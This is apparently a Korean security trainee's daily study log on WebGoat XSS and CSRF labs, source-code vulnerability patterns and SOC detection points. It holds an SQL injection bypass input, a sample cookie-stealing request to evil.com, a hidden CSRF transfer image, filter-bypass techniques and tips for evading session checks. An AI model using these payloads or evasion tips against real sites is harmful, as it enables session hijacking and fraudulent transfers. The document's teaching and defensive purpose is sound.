---
title: "2025.12.22 (Day 40) - XSS 공격과 소스코드 취약점 분석"
date: 2025-12-22
draft: false
tags: ["XSS", "CSRF", "소스코드분석", "WebGoat", "쿠키", "세션", "보안코딩", "OWASP"]
categories: ["daily-logs"]
summary: "Stored XSS/Reflected XSS/CSRF 공격 실습, 소스코드 취약점 함수 패턴 분석, 행정안전부 7대 보안 개발 유형, SOC 관점 XSS/CSRF 탐지 포인트"
---

# 📄 2025.12.22 (Day 40) - XSS 공격과 소스코드 취약점 분석

---

## 1. 핵심 개념 정리

### XSS (Cross-Site Scripting) 공격

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 1 | **XSS 공격 원리** | 사용자 입력값을 적절히 검증하지 않아 악성 스크립트가 실행되는 취약점 | OWASP Top 10에 포함되는 중대한 취약점. 사용자 세션 탈취, 피싱, 악성코드 유포 등 다양한 공격 경로 제공 |
| 2 | **쿠키(Cookie)** | 사용자 인증 정보를 담은 4KB 이하의 클라이언트 저장 파일 | 세션 관리의 핵심 요소. XSS 공격의 주요 타겟으로 쿠키 탈취 시 세션 하이재킹 가능 |
| 3 | **Stored XSS** | 악성 스크립트를 서버 DB에 저장하여 모든 열람자에게 공격 | 지속적 공격 가능. 게시판, 댓글 등에서 발생. 피해 범위가 광범위함 |
| 4 | **Reflected XSS** | URL 파라미터 등을 통해 즉시 반사되는 XSS 공격 | 피싱 링크와 결합하여 사용. 소셜 엔지니어링 필요. 일회성 공격 |
| 5 | **CSRF 공격** | 사용자가 인지하지 못하는 상태에서 강제로 특정 요청을 보내는 공격 | 인증된 세션을 악용. 금전 거래, 설정 변경 등 중요 작업에 치명적 |

### 소스코드 취약점 분석 방법론

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 6 | **Black Box Testing** | 소스코드 없이 외부 인터페이스 분석 | 빠른 취약점 발견 가능. 실제 공격자 시점과 유사. 모의해킹에 주로 사용 |
| 7 | **White Box Testing** | 소스코드를 직접 분석하여 취약점 발견 | 근본적 취약점 식별 가능. 시간 소요 크지만 정확도 높음. 개발 단계에서 활용 |
| 8 | **Gray Box Testing** | Black Box와 White Box의 혼합 방식 | 효율성과 정확성의 균형. 실무에서 가장 많이 사용되는 방식 |
| 9 | **입력값 검증 취약점** | 사용자 입력을 필터링 없이 처리하여 발생 | SQL Injection, XSS, 파일 업로드, 경로 조작 등 다양한 공격의 근본 원인 |
| 10 | **세션 처리 취약점** | 쿠키/세션 관리 미흡으로 인증/인가 우회 | 매개변수 조작, 강제 브라우징 등으로 권한 상승 공격 가능 |

### 행정안전부 소프트웨어 개발 보안 가이드 7대 유형

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 11 | **입력 데이터 검증 및 표현** | SQL Injection, XSS, 파일 업로드 등 | OWASP Top 10의 대부분이 여기 포함. 가장 빈번하게 발생하는 취약점 유형 |
| 12 | **보안 기능** | 인증, 접근제어, 암호화 등 보안 메커니즘 | 설계 단계부터 고려해야 할 핵심 요소. 사후 보완 어려움 |
| 13 | **시간 및 상태** | 동시성 제어, TOCTOU 등 | Race Condition 공격 방어. 트랜잭션 처리 중요 |
| 14 | **에러 처리** | 과도한 정보 노출 방지 | 스택 트레이스, 경로 정보 등 민감 정보 노출 차단 |
| 15 | **코드 오류** | 메모리 누수, 자원 관리 등 | 시스템 안정성과 직결. DoS 공격 방어 |

---

## 2. 실습 내용 정리

### 실습 1: Stored XSS 공격 (WebGoat)

**목표:** 게시판에 악성 스크립트를 저장하여 다른 사용자 공격

**실습 환경:**
- WebGoat 실습 플랫폼
- Cross-Site Scripting(XSS) > Stored XSS Attacks
- 게시판 형태의 메시지 저장 기능

**실습 단계:**
1. Stored XSS Attacks 메뉴 접속
2. Title과 Message 필드에 악성 코드 삽입
   - Title: Hello~
   - Message: Hello. This is KG.
   - 스크립트 태그로 경고창을 출력하는 코드 추가
3. Submit 버튼으로 게시물 저장
4. Message List에서 저장된 게시물 확인
5. 게시물 클릭 시 스크립트 실행 확인

**분석 포인트:**
- **getRawParameter** 함수로 필터링 없이 입력값 수용
- 데이터베이스에 스크립트 그대로 저장
- 게시물 조회 시 HTML로 렌더링되어 스크립트 실행
- 모든 사용자가 게시물 열람 시 공격 대상이 됨

**보안 인사이트:**
- Stored XSS는 한 번의 공격으로 다수 피해자 발생 가능
- 게시판, 댓글, 프로필 정보 등 사용자 입력이 저장되는 모든 곳이 공격 벡터
- 쿠키 탈취 시 document.cookie를 공격자 서버로 전송 가능

### 실습 2: Reflected XSS 공격 (WebGoat)

**목표:** URL 파라미터를 통한 즉시 반사형 XSS 공격

**실습 환경:**
- WebGoat > Cross-Site Scripting(XSS) > Reflected XSS Attacks
- 쇼핑 카트 시스템 / 신용카드 정보 입력 폼

**실습 단계:**
1. Reflected XSS Attacks 메뉴 접속
2. 페이지 소스코드 확인 (요소 검사)으로 access code 입력 필드 확인
3. 악성 스크립트 작성 및 삽입
   - 입력 필드에 따옴표로 태그를 탈출한 뒤 script 태그로 새 창 오픈 코드 삽입
4. Purchase 버튼 클릭
5. 스크립트 실행으로 외부 사이트 창이 강제 오픈됨을 확인

**Reflected XSS 원리:**
1. 공격자가 악성 스크립트가 포함된 URL 생성
2. 소셜 엔지니어링으로 피해자에게 URL 전달
3. 피해자가 링크 클릭 시 서버가 악성 스크립트를 응답에 포함하여 반환
4. 브라우저가 응답을 렌더링하며 스크립트 실행

**발견 가능한 취약점 패턴:**
- URL 파라미터가 필터링 없이 HTML에 삽입되는 경우
- 에러 메시지에 사용자 입력이 그대로 출력되는 경우
- 검색 결과 페이지에서 검색어가 필터링 없이 표시되는 경우

**방어 방법:**
- 입력값 검증: 화이트리스트 기반 필터링
- 출력 인코딩: HTML Entity Encoding 적용
- HTTPOnly 쿠키: JavaScript 접근 차단

### 실습 3: CSRF (Cross-Site Request Forgery) 공격 (WebGoat)

**목표:** 사용자가 인지하지 못하는 상태에서 강제로 자금 이체 요청 전송

**실습 환경:**
- WebGoat > Cross-Site Scripting(XSS) > Cross Site Request Forgery(CSRF)
- 뉴스그룹 메시지 게시판 / 자금 이체 기능

**실습 단계:**
1. CSRF 메뉴 접속
2. CSRF 공격 코드 작성
   - Title: Product Question
   - Message: 상품이 아직 도착하지 않았습니다.
   - 이미지 태그 src에 자금 이체 URL을 삽입 (height=1 width=1로 숨김)
3. Submit으로 게시물 등록
4. 다른 사용자가 게시물 열람 시 자동으로 5000 이체 실행

**CSRF 공격 메커니즘:**
1. 공격자가 악성 요청이 포함된 HTML을 게시판에 삽입
2. 피해자가 해당 게시물 조회
3. 브라우저가 이미지 로딩을 위해 자동으로 URL 요청
4. 피해자의 인증된 세션으로 자금 이체 요청 전송
5. 서버가 정상 요청으로 판단하여 이체 실행

**방어 방법:**
- **CSRF Token**: 예측 불가능한 토큰을 폼에 포함
- **SameSite Cookie**: 크로스 사이트 요청 시 쿠키 전송 차단
- **Referer/Origin 검증**: 요청 출처 확인
- **중요 작업 재인증**: 패스워드 재입력 요구

---

## 3. 취약점 유형별 분석 비교

### XSS 공격 유형 비교

| 항목 | Stored XSS | Reflected XSS | DOM-based XSS | CSRF |
|:---:|:---|:---|:---|:---|
| **공격 저장 위치** | 서버 DB에 저장 | URL 파라미터 | 클라이언트 DOM | 피해자 브라우저 |
| **공격 지속성** | 영구적 (삭제 전까지) | 일시적 (링크 클릭 시) | 일시적 | 일시적 |
| **피해자 범위** | 게시물 조회 모든 사용자 | 링크 클릭 사용자만 | 링크 클릭 사용자만 | 링크 클릭 사용자만 |
| **주요 발생 위치** | 게시판, 댓글, 프로필 등 | 검색, 에러 메시지 등 | JavaScript 기반 SPA | 송금, 설정 변경 등 |

### 소스코드 취약점 함수 비교 (Java)

| 예시 | 설명 | 보안 영향 |
|:---|:---|:---|
| **getParameter() / getRawParameter()** | 필터링 없이 입력값 수신 | XSS, SQL Injection 취약 |
| **executeQuery(query)** | 동적 쿼리 실행 | SQL Injection 취약 |
| **getCookies()** | 쿠키로 인증/인가 처리 | 쿠키 조작 공격 취약 |
| **FileInputStream / FileOutputStream** | 파일 입출력 처리 | 경로 조작, 악성 파일 업로드 취약 |

---

## 4. 심화 분석

### 소스코드 취약점 패턴 분석

| 구분 | 취약한 패턴 | 안전한 패턴 | 분석/인사이트 |
|:---:|:---|:---|:---|
| **SQL Injection** | 문자열 연결로 쿼리 생성 | Prepared Statement 사용 | 동적 쿼리는 항상 파라미터 바인딩 필수 |
| **XSS** | getRawParameter() 직접 출력 | HtmlEncoder.encode() 사용 | 출력 시점에 인코딩이 핵심 |
| **파일 업로드** | 확장자 검증 없음 | 화이트리스트 + MIME 타입 검증 | 확장자만 검증 시 우회 가능 |
| **세션 관리** | 쿠키 값으로 권한 판단 | 서버 세션 + CSRF 토큰 | 클라이언트 데이터는 신뢰 불가 |

### SQL Injection 취약 코드 vs 안전 코드 (Java)

**취약한 패턴:**
- `String query = "SELECT * FROM employee WHERE userid = " + userId + " and password = '" + password + "'";`
- 공격 입력: userId = "admin", password = "'or''='"
- 실행 쿼리: WHERE userid = admin and password = ''or''='' => 인증 우회

**안전한 패턴:**
- `String query = "SELECT * FROM employee WHERE userid = ? and password = ?";`
- `PreparedStatement pstmt = connection.prepareStatement(query);`
- pstmt.setString(1, userId); pstmt.setString(2, password);
- 파라미터 바인딩으로 입력값이 쿼리 구조에 영향을 주지 않음

### XSS 방어 기법 비교

**취약한 패턴:**
- `String message = s.getParser().getRawParameter(MESSAGE, "");`
- `statement.setString(3, message);` => DB에 스크립트 그대로 저장

**안전한 패턴:**
- `String message = HtmlEncoder.encode(s.getParser().getRawParameter(MESSAGE, ""));`
- `statement.setString(3, message);` => HTML 인코딩하여 저장

---

## 5. 실무/보안 적용

### SOC 분석가 관점 - XSS/CSRF 탐지 포인트

| 단계/유형 | 탐지 포인트 | 로그 예시 | 대응 방안 |
|:---:|:---|:---|:---|
| **XSS 공격 시도** | URL/POST 데이터에 script 태그, document.cookie 문자열, javascript: 프로토콜 | POST /board/write message=script 태그 포함 | WAF 룰 업데이트, 해당 계정 모니터링 강화, 관리자에게 게시물 검토 요청 |
| **CSRF 공격 시도** | Referer 헤더 불일치, 중요 작업에 GET 요청, CSRF 토큰 없는 요청 | GET /transfer?amount=5000&to=attacker Referer: http://evil.com | 의심 거래 차단, 사용자 계정 임시 잠금, 긴급 패치 요청 |
| **쿠키 탈취 시도** | 외부 도메인으로 쿠키 전송, Base64 인코딩된 의심 데이터, 새로운 IP에서 세션 사용 | img src=http://evil.com/steal?cookie=SESSIONID123 | 해당 세션 즉시 무효화, 사용자 비밀번호 재설정 유도, 접근 IP 분석 및 차단 |

### 소스코드 보안 점검 체크리스트

**입력값 검증 - 점검 방법:**
- 입력 함수 검색: getParameter, getRawParameter, request.getQueryString 등 사용 코드 탐색
- SQL 쿼리 생성 부분 검색: executeQuery, executeUpdate 사용 패턴 확인
- 파일 업로드 처리 검색: FileInputStream, FileOutputStream, MultipartFile 사용 확인
- 쿠키 사용 검색: getCookies, setCookie 사용 부분 확인
- 세션 처리 검색: setAttribute, getAttribute, getSession 사용 패턴 확인

**XSS 방어 검증:**
- 출력 인코딩 검증: HtmlEncoder, escapeHtml, encodeForHTML 사용 여부 확인
- Content-Security-Policy 헤더 설정 확인
- HTTPOnly 쿠키 설정 확인: setHttpOnly, httpOnly 속성 적용 여부

### 개발자 보안 가이드

**안전한 코딩 원칙:**
- **입력은 모두 악의적이라고 가정**: 모든 사용자 입력에 검증 적용
- **출력 인코딩 필수**: HTML, JavaScript, SQL 등 컨텍스트별 인코딩
- **최소 권한 원칙**: 필요한 최소한의 권한만 부여
- **심층 방어**: 여러 계층에서 보안 통제 적용

---

## 6. 배운 점 및 인사이트

### 새로 알게 된 점

- **XSS 공격의 다양성:** Stored, Reflected, DOM-based 등 유형별로 공격 벡터와 대응 방법이 다름
- **CSRF vs XSS 차이:** XSS는 스크립트 실행, CSRF는 요청 위조. 공격 목적과 방어 방법이 완전히 다름
- **쿠키의 양면성:** 편의성 제공하지만 XSS 공격의 주요 타겟. HTTPOnly, Secure, SameSite 속성의 중요성
- **소스코드 보안 분석 방법론:** Black/White/Gray Box Testing의 장단점과 실무 적용 전략
- **행정안전부 개발 보안 가이드:** 국내 공공기관 및 금융권에서 의무적으로 준수해야 하는 보안 표준

### 이전 학습과의 연결고리

- **SQL Injection과 XSS:** 모두 입력값 검증 미흡이 근본 원인. 공격 메커니즘은 다르지만 방어 원칙은 동일
- **Burp Suite 활용 확장:** 이전에 학습한 Burp Suite로 XSS 공격 자동화 및 CSRF 토큰 분석 가능
- **웹 아키텍처 이해 심화:** 쿠키/세션 메커니즘, HTTP 프로토콜, 브라우저 렌더링 과정 등 웹 기초 지식 필수

### 실무 적용 아이디어

**SOC 분석가 관점:**
- **XSS 탐지 룰 개발:** WAF에 script 태그, onerror= , document.cookie 등 키워드 기반 탐지 룰 적용
- **CSRF 이상 행위 탐지:** Referer 헤더 검증, 중요 작업의 비정상적인 요청 패턴 모니터링
- **쿠키 탈취 의심 알림:** 동일 세션 ID가 서로 다른 국가/IP에서 사용될 때 경보

**모의해킹/진단 관점:**
- **자동화 도구 개발:** XSS 페이로드 자동 삽입 및 결과 검증 스크립트 작성
- **소스코드 정적 분석:** SAST 도구를 활용한 취약 함수 패턴 자동 탐지
- **POC 문서화:** 발견된 취약점을 재현 가능한 POC로 작성하여 개발팀에 전달

---

## 7. Quick Reference

### XSS/CSRF 공격 페이로드 유형 정리

**기본 XSS 테스트 패턴:**
- 기본 alert 스크립트 삽입 테스트
- document.cookie 탈취 스크립트 삽입

**필터 우회 기법:**
- 이중 꺾쇠 등으로 script 태그 우회
- img 태그 onerror 이벤트 활용
- svg onload 이벤트 활용
- URL 인코딩 우회 (%3C = <, %3E = >)

**CSRF 공격 패턴:**
- img 태그 src에 자금 이체 URL 삽입 (width=0 height=0으로 숨김)
- form 자동 제출 방식 (hidden form + script submit)

### 프로그래밍 언어별 위험 함수 요약표

| 구분 | Java | ASP.NET | 핵심 키워드 | 주요 내용 | 적용 방법 |
|:---:|:---|:---|:---|:---|:---|
| **입력 처리** | getParameter, getRawParameter | Params, QueryString, InputStream | 사용자 입력 수신 | 필터링 없이 입력받음 | 화이트리스트 검증 적용 |
| **세션 관리** | setAttribute, getAttribute, getCookies | Add, Item, Keys | 세션/쿠키 처리 | 권한 관리에 직접 사용 위험 | 서버 세션 기반 인증 |
| **파일 처리** | FileInputStream, FileWriter | FileStream, StreamReader | 파일 입출력 | 경로 조작 취약 | 경로 검증 및 샌드박스 |
| **DB 접근** | executeQuery, createStatement | SqlCommand, SqlDataAdapter | 쿼리 실행 | SQL Injection 취약 | Prepared Statement 사용 |

### 보안 점검 체크리스트

**웹 애플리케이션 XSS 점검:**
- [ ] 모든 사용자 입력에 HTML Entity Encoding 적용
- [ ] Content-Security-Policy 헤더 설정
- [ ] HTTPOnly, Secure 플래그 쿠키 설정
- [ ] X-XSS-Protection 헤더 활성화

**CSRF 방어 체크:**
- [ ] CSRF 토큰 생성 및 검증 로직 구현
- [ ] SameSite Cookie 속성 설정
- [ ] Referer/Origin 헤더 검증
- [ ] 중요 작업에 재인증 절차 추가

**소스코드 보안 점검:**
- [ ] 입력 검증: 화이트리스트 기반 필터링
- [ ] 출력 인코딩: 컨텍스트별 인코딩 함수 사용
- [ ] 세션 관리: 서버 세션 + HTTPS + Secure Cookie
- [ ] 에러 처리: 상세 에러 정보 노출 방지
- [ ] 하드코딩: 패스워드, API 키 등 환경 변수로 관리

---

## 8. 트러블슈팅

| 문제 | 원인 | 해결 방법 |
|:---|:---|:---|
| XSS 공격이 실행되지 않음 | 브라우저 XSS 필터 작동, WAF/IPS 차단, CSP 헤더 설정 | 다양한 페이로드 시도, 인코딩 우회 기법 적용, DOM-based XSS로 전환 |
| CSRF 토큰이 있어 공격 실패 | 프레임워크 기본 CSRF 방어, 커스텀 토큰 검증 로직 | 토큰 생성 패턴 분석, 토큰 없는 엔드포인트 탐색, XSS + CSRF 조합 공격 |
| 쿠키 탈취 후 세션 사용 불가 | IP 기반 세션 검증, User-Agent 검증, 세션 타임아웃 | 피해자와 동일 IP 대역 사용, User-Agent 스푸핑, 빠른 시간 내 공격 실행 |
| 소스코드 분석 시간 과다 소요 | 코드 양 방대, 프레임워크 의존성 복잡 | SAST 도구 활용 (SonarQube, Checkmarx), 위험 함수 패턴 grep 검색, 입력-출력 경로 추적 우선 |

---

**Today's Insight:**

XSS와 CSRF는 웹 애플리케이션 보안의 양대 산맥으로, 모두 사용자 브라우저를 공격 경로로 활용하지만 메커니즘은 완전히 다르다. XSS는 악성 스크립트 실행을 통해 쿠키 탈취, 피싱 페이지 삽입 등을 수행하며, CSRF는 인증된 사용자의 권한을 도용하여 의도하지 않은 작업을 강제 실행한다. 방어 핵심은 XSS의 경우 입력 검증과 출력 인코딩, CSRF의 경우 토큰 기반 검증과 SameSite 쿠키 설정이다.

소스코드 취약점 분석은 Black Box와 White Box 접근법을 혼합한 Gray Box 방식이 실무에서 가장 효과적이며, 특히 입력값을 받는 함수(getParameter, getRawParameter)와 출력/실행하는 함수(executeQuery, setAttribute) 사이의 데이터 흐름을 추적하는 것이 핵심이다. 행정안전부 개발 보안 가이드의 7대 유형은 국내 보안 규제의 기준이 되므로, 공공기관 및 금융권 진단 시 필수적으로 숙지해야 한다.
